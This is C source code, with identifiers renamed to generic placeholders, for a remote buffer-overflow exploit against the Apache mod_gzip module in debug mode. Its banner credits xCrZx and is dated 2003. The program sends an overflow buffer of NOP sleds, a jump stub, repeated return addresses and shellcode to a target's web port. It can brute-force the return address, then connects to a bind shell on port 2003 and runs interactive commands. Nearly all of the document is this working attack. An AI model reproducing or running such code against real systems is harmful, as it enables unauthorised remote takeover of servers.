
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int tmp ;
struct TYPE_3__ {void* s_addr; } ;
struct sockaddr_in {void* sin_port; TYPE_1__ sin_addr; void* sin_family; int sin_zero; } ;
struct sockaddr {int dummy; } ;
struct hostent {int dummy; } ;
typedef int sockstruct ;
typedef int fd_set ;
struct TYPE_4__ {long ret; long std_err; char* shellcode; char* jmp; } ;


 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int FUNC_2 (int *) ;
 void* VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 size_t FUNC_3 (char*) ;
 int FUNC_4 (int ,int) ;
 int FUNC_5 (int) ;
 int FUNC_6 (int,struct sockaddr*,int) ;
 int FUNC_7 (int ) ;
 int FUNC_8 (int ) ;
 char* VAR_4 ;
 void* FUNC_9 (char*) ;
 void* FUNC_10 (int) ;
 int FUNC_11 (char*,char*,int) ;
 int FUNC_12 (char*,int,int) ;
 int FUNC_13 (char*,...) ;
 int FUNC_14 (int,char*,int) ;
 int FUNC_15 (int,int *,int *,int *,int *) ;
 int FUNC_16 (int) ;
 int FUNC_17 (void*,int ,int ) ;
 int FUNC_18 (char*,char*,char*,char*,int,char*) ;
 int FUNC_19 (char*,char*,long*) ;
 int VAR_5 ;
 int FUNC_20 (char*) ;
 long FUNC_21 (char*,int ,int) ;
 TYPE_2__* VAR_6 ;
 int FUNC_22 (char*) ;
 int FUNC_23 (int,char*,int) ;

int FUNC_24(int VAR_7, char **VAR_8) {

        int VAR_9=0;
        struct sockaddr_in VAR_10;
        struct hostent *VAR_11;
        char VAR_12[20000];
        char VAR_13[5000],VAR_14[10000];
        int VAR_15;
        fd_set VAR_16;
        int VAR_17=80,VAR_18=2003;
        int VAR_19=VAR_3;
        char *VAR_20=((void*)0);
        long VAR_21=0xbfffffff,VAR_22;
        int VAR_23=0;
        char *VAR_24,*VAR_25;
        int VAR_26=0;

        FUNC_13("\nremote exploit for mod_gzip (debug_mode) [Linux/*BSD]\n\t\t by xCrZx [crazy_einstein@yahoo.com] /05.06.03/\n");

        for(VAR_9=0;VAR_9<VAR_7;VAR_9++) {
                if(VAR_8[VAR_9][1]=='h') VAR_20=VAR_8[VAR_9+1];
                if(VAR_8[VAR_9][1]=='p') VAR_17=FUNC_3(VAR_8[VAR_9+1]);
                if(VAR_8[VAR_9][1]=='t') {VAR_21=VAR_6[FUNC_3(VAR_8[VAR_9+1])].ret;VAR_26=FUNC_3(VAR_8[VAR_9+1]);}
                if(VAR_8[VAR_9][1]=='r') FUNC_19(VAR_8[VAR_9+1],"0x%x",&VAR_21);
                if(VAR_8[VAR_9][1]=='b') { VAR_23=1; VAR_21=FUNC_21(VAR_8[VAR_9+1],0,16);}
                if(VAR_8[VAR_9][1]=='s') { VAR_19=FUNC_3(VAR_8[VAR_9+1]);}
        }

        if(!VAR_20 || VAR_21==0) FUNC_22(VAR_8[0]);

        VAR_22=VAR_6[VAR_26].std_err;
        VAR_24=VAR_6[VAR_26].shellcode;
        VAR_25=VAR_6[VAR_26].jmp;

        FUNC_13("\nUsing: ret_err = 0x%x, ret = 0x%x",VAR_22,VAR_21);
        if(VAR_23) FUNC_13(" ,step = %d\n",VAR_19);

        FUNC_13("\n");

        if(VAR_23)FUNC_13("[~] Brutemode activated!\n");

        do {

        VAR_15=FUNC_17(VAR_0,VAR_1,0);
        VAR_10.sin_family=VAR_0;
        VAR_10.sin_addr.s_addr=FUNC_9(VAR_20);
        VAR_10.sin_port=FUNC_10(VAR_17);

        if(!VAR_23)FUNC_13("\n[!] Connecting to %s:%d\n",VAR_20,VAR_17);

        if(FUNC_6(VAR_15,(struct sockaddr*)&VAR_10,sizeof(VAR_10))>-1) {

                if(!VAR_23)FUNC_13("[+] Connected!\n",VAR_9);

                FUNC_12(VAR_12 ,0x00,sizeof VAR_12 );
                FUNC_12(VAR_13,0x00,sizeof VAR_13);
                FUNC_12(VAR_14,0x00,sizeof VAR_14);

                FUNC_12(VAR_13,0x90,2016);
                FUNC_11(VAR_13+FUNC_20(VAR_13),VAR_25,FUNC_20(VAR_25));
                FUNC_12(VAR_13+FUNC_20(VAR_13),0x90,2280);
                *(long *)&VAR_13[FUNC_20(VAR_13)]=VAR_22;
                for(VAR_9=0;VAR_9<100;VAR_9++) *(long *)&VAR_13[FUNC_20(VAR_13)]=VAR_21;

                FUNC_12(VAR_14,0x90,1000);
                FUNC_11(VAR_14+FUNC_20(VAR_14),VAR_24,FUNC_20(VAR_24));

                FUNC_18(VAR_12,VAR_4,VAR_13,VAR_20,FUNC_20(VAR_14),VAR_14);
                FUNC_23(VAR_15,VAR_12,FUNC_20(VAR_12));

        }else { FUNC_13("[x] Error: Could not connect to %s:%d!\n",VAR_20,VAR_17);FUNC_7(0);}

        FUNC_5(VAR_15);

        VAR_21-= VAR_19;

        if(VAR_23) {FUNC_13(".");FUNC_8(VAR_5);}


        if(!VAR_23) {
                FUNC_13("[*] Trying to connect to %s:%d port!!! Pray for success!\n",VAR_20,VAR_18);
                FUNC_13("[*] Sleeping at 2 seconds...\n");
        }

        FUNC_16(2);

        VAR_15=FUNC_17(VAR_0,VAR_1,0);

        FUNC_4(VAR_10.sin_zero,sizeof(VAR_10.sin_zero));
        VAR_10.sin_family=VAR_0;
        VAR_10.sin_addr.s_addr=FUNC_9(VAR_20);
        VAR_10.sin_port=FUNC_10(VAR_18);

        if(FUNC_6(VAR_15,(struct sockaddr*)&VAR_10,sizeof(VAR_10))>-1) {
                FUNC_13("\n[!] Shell is accessible!\n\n");
                FUNC_23(VAR_15, "id;uname -a\n", 12);
                while (1) {
                        FUNC_2(&VAR_16);
                        FUNC_1(VAR_15,&VAR_16);
                        FUNC_1(VAR_2,&VAR_16);
                        FUNC_15(VAR_15 + 1, &VAR_16, ((void*)0), ((void*)0), ((void*)0));

                        if (FUNC_0(VAR_15, &VAR_16)) {
                                VAR_9 = FUNC_14(VAR_15, VAR_12, sizeof(VAR_12) - 1);
                                if (VAR_9 <= 0) {
                                        FUNC_13("[!] Connection closed.\n");
                                        FUNC_5(VAR_15);
                                        FUNC_7(0);
                                }
                        VAR_12[VAR_9] = 0;
                        FUNC_13("%s", VAR_12);
                        }
                        if (FUNC_0(VAR_2, &VAR_16)) {
                                VAR_9 = FUNC_14(VAR_2, VAR_12, sizeof(VAR_12) - 1);
                                if (VAR_9 > 0) {
                                        VAR_12[VAR_9]=0;
                                        FUNC_23(VAR_15, VAR_12, VAR_9);
                                }
                        }
                }
        } else if(!VAR_23)FUNC_13("[x] Shell is inaccessible..\n\n");

        FUNC_5(VAR_15);

        } while ( VAR_23 );


        return 0;
}
